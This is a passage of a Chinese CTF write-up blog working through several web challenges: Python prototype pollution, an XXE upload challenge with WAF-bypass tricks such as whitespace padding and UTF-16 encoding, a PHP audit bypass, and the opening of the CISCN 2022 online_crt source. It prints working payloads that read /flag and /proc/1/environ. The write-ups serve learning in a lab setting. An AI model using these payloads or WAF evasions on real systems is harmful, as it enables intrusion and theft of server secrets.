Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>

<p>提供了一个注册的路由和登录的路由</p>
<p>以为是session伪造</p>
<p>但是解码的时候没有提供密钥</p>
<p>看wp吧害</p>
<h2 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h2><p>在 Python中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等<br>需要合并函数merge（src，dst）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):  <span class="comment">#src为原字典，dst为目标字典</span></span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment">#键值对字典形式</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))  <span class="comment">#递归到字典最后一层</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment">#class形式</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))  <span class="comment">#递归到最终的父类</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（这里不是很会等学了面向对象编程再说）</p>
<p>注意到调用了__file__类，可以调用全局变量将这个file修改为需要的&#x2F;flag目录</p>
<p>过滤了__init__,可以使用uncode去编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;../../../proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发包之后再源文件就可以得到flag</p>
<p>后面更新会减少 </p>
<p>开始学jvav啦</p>
<h2 id="12-CSAWQual-2019-Unagi看xxe各种绕过"><a href="#12-CSAWQual-2019-Unagi看xxe各种绕过" class="headerlink" title="12[CSAWQual 2019]Unagi看xxe各种绕过"></a>12[CSAWQual 2019]Unagi看xxe各种绕过</h2><p>打开环境</p>
<p>网站给了我们一个上传文件的接口</p>
<p>上传简单的1.php一句话木马，显示上传不为所需的文件后缀</p>
<p>随便上传了一个1.1，也被过滤，看来是白名单</p>
<p>nikto是扫描，看到nigix的版本是1.12，查了下有没有现成的cve</p>
<p>有的但是用不上</p>
<p>看到有一个here界面，看到以下内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看来这里上传的应该是xml文件</p>
<p>尝试上传一个恶意的xml文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是显示被waf掉了</p>
<p>这里需要绕过</p>
<h2 id="xxe的各种绕过"><a href="#xxe的各种绕过" class="headerlink" title="xxe的各种绕过"></a>xxe的各种绕过</h2><p>1.XML通常用于从movies到Docker容器的所有内容的元数据，并且是API协议(如REST、WSDL、SOAP、Web-RPC和其他协议)的基础，而且，一个应用程序可能包含多个链接的XML解释器，这些解释器处理来自不同应用程序层的数据。这种通过XML解释器在应用程序堆栈中的不同位置注入外部实体的潜在隐患使XXE变得很危险。</p>
<p>XXE不是一个bug，而是XML解析器的well-documented特性。XML数据格式允许您在XML文档中包含任何外部文本文件的内容。</p>
<p>以下为一次xxe攻击的实例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在&lt;?xml&gt;里面确定文档的特征，版本和编码等</p>
<p>在&lt;!DOCTYPE&gt;里面设置外部链接</p>
<p>在下面的正文里面加入设置的外部链接然后输出链接对应内容</p>
<p>（1）开头添加额外空格</p>
<p>waf在检测xml文件的时候，可能只检查了xml文档的开头部分，只解析了他的开头</p>
<p>同时xml也允许在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格</p>
<p>直接构造一个超级长的空格串，然后绕过waf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?xml[....1000000空格......]version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;root&gt;&amp;xxe&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>（2）无效的格式</p>
<p>有的WAF不会读取链接文件的内容，但是当链接的文件存在在声明里面，这意味着未读取文件内容的WAF将不会读取文档中实体的声明。而指向未知实体的链接又会阻止XML解析器导致错误。</p>
<p>（3）外来编码</p>
<p>这也就是此题的解法</p>
<p>除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。</p>
<p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</p>
<p>这里直接使用utf-16转换文档，上传之后得到flag、</p>
<p>（4）在一个文档中使用两种类型的编码</p>
<p>不同的解析器可能在不同的时间转换编码。Java解析器(javax.xml.parsers)在<?xml?>结束后严格地更改字符集，而libxml2解析器可以在执行“编码”属性的值之后或在处理<?xml?>之前或之后切换编码。</p>
<p>参考</p>
<p>[绕过WAF保护的XXE - 先知社区 (aliyun.com)](<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059#:~:text=libxml2%E7%9A%84%E6%96%87%E6%A1%A3%EF%BC%8C%E5%9C%A8%E6%A0%87%E8%AE%B0%E4%B8%AD%E9%97%B4%E5%B0%86%E7%BC%96%E7%A0%81%E4%BB%8Eutf-16le%E6%9B%B4%E6%94%B9%E4%B8%BAutf-16be%EF%BC%9A">https://xz.aliyun.com/t/4059#:~:text=libxml2的文档，在标记中间将编码从utf-16le更改为utf-16be：</a> libxml2的文档，编码从utf-8改为ebcdic-us：,正如你所看到的，有许多绕过方法。 防止XXE的最好方法是配置应用程序本身，以安全的方式初始化XML解析器。)</p>
<h2 id="13-NCTF-2018-Easy-Audit"><a href="#13-NCTF-2018-Easy-Audit" class="headerlink" title="13[NCTF 2018]Easy_Audit"></a>13[NCTF 2018]Easy_Audit</h2><p>源码都给了，要什么飞机（还是不会做）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/yulige|flag|nctf/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;<span class="comment">//直接传入数组就可以让两边都可以变为false</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;<span class="comment">//直接双写n绕过</span></span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上来就有一个问题</p>
<p>$_REQUEST检测了所有上传的数据，一旦检测到存在字母就直接die()；</p>
<h3 id="REQUEST变量覆盖"><a href="#REQUEST变量覆盖" class="headerlink" title="_REQUEST变量覆盖"></a>_REQUEST变量覆盖</h3><p>当超全局变量request检测的到get和post传了一个同名变量的值，post的值会默认覆盖掉get的值</p>
<p>在这里就可以post和get同时传值的方法来做到绕过</p>
<h3 id="SERVER-‘QUERY-STRING’-绕过"><a href="#SERVER-‘QUERY-STRING’-绕过" class="headerlink" title="$_SERVER[‘QUERY_STRING’]绕过"></a>$_SERVER[‘QUERY_STRING’]绕过</h3><p>$_SERVER[‘QUERY_STRING’]匹配的是原始数据，也就不会经过处理，例如url编码的解码等</p>
<p>可以使用url编码绕过</p>
<p>其他都是常规的</p>
<p>更改文件内容直接使用data伪协议</p>
<h2 id="14-CISCN-2022初赛-online-crt"><a href="#14-CISCN-2022初赛-online-crt" class="headerlink" title="14.[CISCN 2022初赛] online_crt"></a>14.[CISCN 2022初赛] online_crt</h2><p>我这水平还是做不了这种题</p>
<p>上来给了源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> </span></span><br><span class="line"><span class="string">    HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">	oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">		c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.String(<span class="number">200</span>, newname)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.String(<span class="number">200</span>, <span 